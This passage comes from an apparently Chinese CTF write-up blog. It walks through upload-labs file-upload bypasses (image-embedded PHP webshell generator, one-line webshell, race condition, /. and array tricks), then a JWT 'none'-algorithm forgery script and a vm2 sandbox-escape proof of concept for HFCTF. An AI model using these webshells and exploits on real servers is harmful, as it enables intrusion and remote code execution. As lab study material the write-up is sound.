class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第十六关具体可以参考：<a class="foo" href="https://xz.aliyun.com/t/2657#toc-1" target="_blank">传送门</a></p>
<p><strong>分析代码：</strong></p>
<p>首先呢检测<code>$fileext</code>和<code>$filetype</code>是否为<code>gif</code>|<code>png</code>|<code>jpg</code>格式。</p>
<p>然后使用<code>move_uploaded_file</code>函数来做判断条件，如果成功将文件移动到<code>$target_path</code>，就会进入二次渲染的代码,反之上传失败。</p>
<p>这里有一个问题，在<code>move_uploaded_file($tmpname,$target_path)</code>返回true的时候，就已经成功将图片马上传到服务器了，所以下面的二次渲染并不会影响到图片马的上传，这里应该是作者的失误吧。</p>
<p>但是这里的二次渲染是重新生成了文件名，所以可以根据上传后的文件名，来判断上传的图片是二次渲染后生成的图片还是直接由<code>move_uploaded_file</code>函数移动的图片。</p>
<p>这里把<code>move_uploaded_file</code>这个判断条件去除,然后尝试上传图片马。</p>
<p><strong>上传gif:</strong></p>
<p>首先将一句话木马添加到<code>1.gif</code>的文件尾</p>
<img src="http://img.kawhi.xyz/image-20200503173331981.png" style="high:80%;width:80%;" />

<p>然后将上传的gif下载下来，是经过二次渲染的文件<code>28278.gif</code>，用010打开：</p>
<img src="http://img.kawhi.xyz/image-20200503173427515.png" style="high:80%;width:80%;" />

<p>可以发现，在gif末端添加的php代码已经被去除。</p>
<p>绕过gif的二次渲染，只需要找到渲染前后没有变化的位置，然后将php代码写进去，就可以成功上传带有php代码的图片了。</p>
<img src="http://img.kawhi.xyz/image-20200503173827659.png" style="high:80%;width:80%;" />

<p>发现蓝色部分都是没有变化的，于是将一句话写在末尾。</p>
<p>上传之后再下载下来，发现并没有被清除。</p>
<img src="http://img.kawhi.xyz/image-20200503174017083.png" style="high:90%;width:90%;" />

<p>成功连接上。</p>
<p><strong>上传png：</strong></p>
<p>写入IDAT数据块</p>
<p>这里有个脚本可以直接生成写入php一句话木马的png图片</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$p = array(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$img = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($y = <span class="number">0</span>; $y &lt; sizeof($p); $y += <span class="number">3</span>) &#123;</span><br><span class="line">   $r = $p[$y];</span><br><span class="line">   $g = $p[$y+<span class="number">1</span>];</span><br><span class="line">   $b = $p[$y+<span class="number">2</span>];</span><br><span class="line">   $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">   imagesetpixel($img, round($y / <span class="number">3</span>), <span class="number">0</span>, $color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>直接运行后得到1.png</p>
<p>上传之后再下载下来可以看到php代码还在</p>
<img src="http://img.kawhi.xyz/image-20200503212308794.png" style="high:80%;width:80%;" />

<p>这里的一句话木马是：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?=$_GET[0]($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>

<p>首先 <code>?=$_GET[0]</code> 指的是让你以 0 为参数进行传参，其次 <code>$_POST[1]</code> 指的是用 1 来接收提交上来的参数。</p>
<img src="http://img.kawhi.xyz/image-20200503212501216.png" style="high:80%;width:80%;" />

<p>还可连接中国菜刀，这里很奇怪的是连接不了蚁剑。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url:http://127.0.0.1/upload-labs/include.php?file=./upload/6116.png&amp;0=assert</span><br><span class="line">密码：<span class="number">1</span></span><br></pre></td></tr></table></figure>

<img src="http://img.kawhi.xyz/image-20200503212720089.png" style="high:60%;width:60%;" />

<p><strong>上传jpg：</strong></p>
<p>未能复现成功</p>
<h4 id="Pass-17-条件竞争"><a href="#Pass-17-条件竞争" class="headerlink" title="Pass-17(条件竞争)"></a><strong>Pass-17(条件竞争)</strong></h4><p>源代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $ext_arr = array(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    $file_name = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    $upload_file = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = true;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里是先<code>move_uploaded_file</code>函数将上传文件临时保存，再进行判断，如果不在白名单里则unlink删除，在的话就rename重命名，所以这里存在条件竞争。</p>
<p><strong>绕过方法：</strong></p>
<p>用burp开启两个intruder模块，一个用于重复上传，另一个用于重复访问。</p>
<p><strong>重复上传</strong></p>
<img src="http://img.kawhi.xyz/image-20200503201243378.png" style="high:100%;width:100%;" />

<p><strong>重复请求</strong></p>
<img src="http://img.kawhi.xyz/image-20200503201409484.png" style="high:100%;width:100%;" />

<p>设置一下访问次数</p>
<img src="http://img.kawhi.xyz/image-20200503201454724.png" style="high:100%;width:100%;" />

<p>然后同时开启爆破</p>
<img src="http://img.kawhi.xyz/image-20200503201551566.png" style="high:100%;width:100%;" />

<p>可以看到已经成功访问php的配置信息。</p>
<h4 id="Pass-19-绕过"><a href="#Pass-19-绕过" class="headerlink" title="Pass-19(/.绕过)"></a><strong>Pass-19(/.绕过)</strong></h4><p>源代码为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span> (isset($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关于<code>pathinfo</code>函数如下：</p>
<img src="http://img.kawhi.xyz/image-20200503232029310.png" style="high:60%;width:60%;" />

<p><strong>分析源码：</strong></p>
<ul>
<li>没有对上传的文件做判断，只对用户输入的文件名做判断</li>
<li>上传的文件名用户可控</li>
<li>黑名单用于用户输入的文件后缀名进行判断</li>
<li><code>move_uploaded_file()</code>还有这么一个特性，会忽略掉文件末尾的 <code>/.</code></li>
</ul>
<p><strong>绕过方法：</strong></p>
<p><strong>/. 绕过</strong></p>
<img src="http://img.kawhi.xyz/image-20200503230732286.png" style="high:40%;width:40%;" />

<p><strong>apache解析漏洞</strong></p>
<img src="http://img.kawhi.xyz/image-20200503231026310.png" style="high:40%;width:40%;" />

<p>这个好像只能在低版本才能用，高一点的版本就会报错。</p>
<p><strong>00截断绕过</strong></p>
<img src="http://img.kawhi.xyz/image-20200503231812592.png" style="high:80%;width:80%;" />

<p>把+号的二进制改为00即可。</p>
<h4 id="Pass-20-数组-绕过"><a href="#Pass-20-数组-绕过" class="headerlink" title="Pass-20(数组/.绕过)"></a><strong>Pass-20(数组/.绕过)</strong></h4><p>源代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span>(!empty($_FILES[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    //检查MIME</span><br><span class="line">    $allow_type = array(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],$allow_type))&#123;</span><br><span class="line">        $msg = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        //检查文件名</span><br><span class="line">        $file = empty($_POST[&#x27;save_name&#x27;]) ? $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] : $_POST[&#x27;save_name&#x27;];</span><br><span class="line">        <span class="keyword">if</span> (!is_array($file)) &#123;</span><br><span class="line">            $file = explode(<span class="string">&#x27;.&#x27;</span>, strtolower($file));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ext = end($file);</span><br><span class="line">        $allow_suffix = array(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($ext, $allow_suffix)) &#123;</span><br><span class="line">            $msg = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $file_name = reset($file) . <span class="string">&#x27;.&#x27;</span> . $file[count($file) - <span class="number">1</span>];</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $msg = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $msg = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里是先进行了一个<code>Content-Type</code>判断，这个绕过很容易。</p>
<p>然后是检查<code>post</code>进来的<code>save_name</code>，如果是字符串的话就通过<code>explode</code>函数打散成数组。</p>
<p>然后用<code>end()</code>函数提取后缀(即数组最后一个)检查白名单，再用<code>reset($file) . &#39;.&#39; . $file[count($file) - 1]</code>拼接数组第一个和最后一个。这里的<code>end()</code>和<code>$file[count($file) - 1]</code>是相等的。</p>
<p>所以这里传入的是字符串的话，后缀就必为<code>gif</code>、<code>png</code>、<code>jpg</code>，无法达到上传php的目的。因此这里<code>save_name</code>不能以字符串形式传入，而应该以数组形式传入，从而绕过explode函数，构建特殊数组。使得<code>end()</code>能绕过白名单，而<code>$file[count($file) - 1]</code>不等于<code>gif</code>、<code>png</code>、<code>jpg</code>。</p>
<p>这里可以构造<code>save_name[0] = 1.php/</code>，<code>save_name[2] = jpg</code>,这样的话<code>end($file)</code>为<code>jpg</code>，而<code>$file[count($file) - 1]</code>为<code>$file[1]</code>为空。所以最终<code>file_name=1.php/.</code>，到这里就跟Pass-19一样了。</p>
<p><strong>绕过方法：</strong></p>
<img src="http://img.kawhi.xyz/image-20200504131400237.png" style="high:80%;width:80%;" />

<p>成功连接</p>
<img src="http://img.kawhi.xyz/image-20200504131527424.png" style="high:80%;width:80%;" />

<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h4><p>这是一张网上找来的图</p>
<img src="http://img.kawhi.xyz/upload-labs.png" style="high:100%;width:100%;" />]]></content>
      <categories>
        <category>刷题</category>
      </categories>
  </entry>
  <entry>
    <title>虎符&amp;MRCTF</title>
    <url>/2020/04/24/%E8%99%8E%E7%AC%A6%E5%92%8CMRCTF/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h2><p>这次复现的题目是师兄本周开会讲的题目，我都复现了一下，又学到了新的东西。题目具体详情可以参考师兄的文章：<a class="foo" target="_blank" href="https://www.plasf.cn/2020/04/20/HFCTF_WP/">传送门</a></p>
<h2 id="虎符"><a href="#虎符" class="headerlink" title="虎符"></a><strong>虎符</strong></h2><h3 id="easy-login"><a href="#easy-login" class="headerlink" title="easy_login"></a><strong>easy_login</strong></h3><p>首先打开题目源码发现static/js/app.js，进去后发现koa</p>
<p>利用 koa-static 错误配置的源码泄露获得源码，进行审计。直接读取app.js</p>
<p>koa是基于Node.js的web框架。然后再进去controller.js</p>
<p>再进入controllers/api.js。api是通过抓包发现的</p>
<p>源码如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> APIError = <span class="built_in">require</span>(<span class="string">&#x27;../rest&#x27;</span>).APIError;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    <span class="string">&#x27;POST /api/register&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || username === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;register error&#x27;</span>, <span class="string">&#x27;wrong username&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">global</span>.secrets.length &gt; <span class="number">100000</span>) &#123;</span><br><span class="line">            <span class="built_in">global</span>.secrets = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = crypto.randomBytes(<span class="number">18</span>).toString(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">        <span class="keyword">const</span> secretid = <span class="built_in">global</span>.secrets.length;</span><br><span class="line">        <span class="built_in">global</span>.secrets.push(secret)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            token: token</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;POST /api/login&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || !password) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;login error&#x27;</span>, <span class="string">&#x27;username or password is necessary&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> sid = <span class="built_in">JSON</span>.parse(Buffer.from(token.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;base64&#x27;</span>).toString()).secretid;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(sid)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; <span class="built_in">global</span>.secrets.length &amp;&amp; sid &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;login error&#x27;</span>, <span class="string">&#x27;no such secret id&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = <span class="built_in">global</span>.secrets[sid];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> user = jwt.verify(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> status = username === user.username &amp;&amp; password === user.password;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(status) &#123;</span><br><span class="line">            ctx.session.username = username;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;GET /api/flag&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span>(ctx.session.username !== <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;permission error&#x27;</span>, <span class="string">&#x27;permission denied&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> flag = fs.readFileSync(<span class="string">&#x27;/flag&#x27;</span>).toString();</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            flag</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;GET /api/logout&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        ctx.session.username = <span class="literal">null</span>;</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status: <span class="literal">true</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>jwt可以通过这个网站解析：<a class="foo" target="_blank" href="https://jwt.io/">传送门</a></p>
<img src="http://img.kawhi.xyz/image-20200423184848460.png" alt="image-20200423184848460" style="high:80%;width:80%;" />

<p>了解JWT的组成后，我们总结JWT可能存在如下的安全问题：</p>
<blockquote>
<p>1.修改头什么的算法为none</p>
<p>2.若secret较短可以直接使用<a class="foo" target="_blank" href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a></p>
<p>3.秘钥泄露</p>
<p>3.修改算法RS256为HS256</p>
</blockquote>
<p>在这道题中明显是修改算法为none进行绕过。</p>
<p>这里就是注册的时候会生成一个jwt，登录的时候验证这个jwt。</p>
<p>这里写一个脚本构造出jwt</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line">secretid=<span class="number">0.5</span>;</span><br><span class="line">username=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">password=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">rolled=<span class="string">&quot;no&quot;</span></span><br><span class="line"><span class="keyword">const</span> secret = crypto.randomBytes(<span class="number">18</span>).toString(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> token = jwt.sign(&#123;secretid, username, password,rolled&#125;, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;none&#x27;</span>&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(token);</span><br><span class="line"><span class="keyword">const</span> sid = <span class="built_in">JSON</span>.parse(Buffer.from(token.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;base64&#x27;</span>).toString());</span><br><span class="line"><span class="built_in">console</span>.log(sid)</span><br></pre></td></tr></table></figure>

<p>这里要注意的是先注册一个账号然后再提交上面生成的JWT，因为不能让<code>global.secrets</code>这个数组为<code>undefined</code>，我们需要注册一个账号是的其初始化。</p>
<p>原理是用小数绕过 secretid 的限制，将 secret 置空。发现本题考点为利用 node 的 jsonwebtoken 库的已知缺陷：当 jwt secret 为空时，jsonwebtoken 会采用 algorithm none 进行解密。</p>
<p>伪造 secretid 为小数的 token，让 secret 成为 undefined，导致 algorithm 为 none 进而使用户变成 admin</p>
<p>然后这是脚本生成的jwt：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzZWNyZXRpZCI6MC41LCJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiIsInJvbGxlZCI6Im5vIiwiaWF0IjoxNTg3NjQ0MDk4fQ.</span><br></pre></td></tr></table></figure>

<p>然后改包发送：</p>
<img src="http://img.kawhi.xyz/image-20200423211337775.png" alt="image-20200423211337775" style="high:80%;width:80%;" />

<p>再放包放到home这个页面就可以刷新网页进入getflag的界面了。再抓getflag的包发送即可看到flag。</p>
<p>这上面是师兄的思路，官方的脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">base_url = <span class="string">&quot;http://290fb4fb-dc63-46e7-988d-37edb35934ad.node3.buuoj.cn&quot;</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">res = s.post(base_url+<span class="string">&#x27;/api/register&#x27;</span>, data=&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;hhh&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;hhh&quot;</span>&#125;)</span><br><span class="line">token = jwt.encode(&#123;<span class="string">&quot;secretid&quot;</span>:<span class="number">0.333</span>,<span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;admin&quot;</span>&#125;,algorithm=<span class="string">&quot;none&quot;</span>,key=<span class="string">&quot;&quot;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">res = s.post(base_url+<span class="string">&#x27;/api/login&#x27;</span>, data=&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;authorization&quot;</span>: token&#125;)</span><br><span class="line"></span><br><span class="line">res = s.get(base_url+<span class="string">&#x27;/api/flag&#x27;</span>)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>

<p>直接运行也可以得到flag。</p>
<h3 id="just-escape"><a href="#just-escape" class="headerlink" title="just_escape"></a><strong>just_escape</strong></h3><p>打开F12发现这个：X-Powered-By：Express</p>
<p>运行代码 <code>run.php?code=Error().stack</code> 根据报错信息发现是 vm2 的沙盒逃逸问题。搜索可得 vm2 最新沙盒逃逸 poc：<a class="foo" target="_blank" href="https://github.com/patriksimek/vm2/issues/225">传送门</a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">TypeError</span>.prototype.get_process = <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">&quot;return process&quot;</span>)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">&quot;&quot;</span>)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> e.get_process(<span class="function">()=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami&quot;</span>).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>

<p>直接使用的话发现存在waf:</p>
<img src="http://img.kawhi.xyz/image-20200423213317676.png" alt="image-20200423213317676" style="high:80%;width:80%;" />

<p>fuzz发现程序过滤了以下关键字：</p>
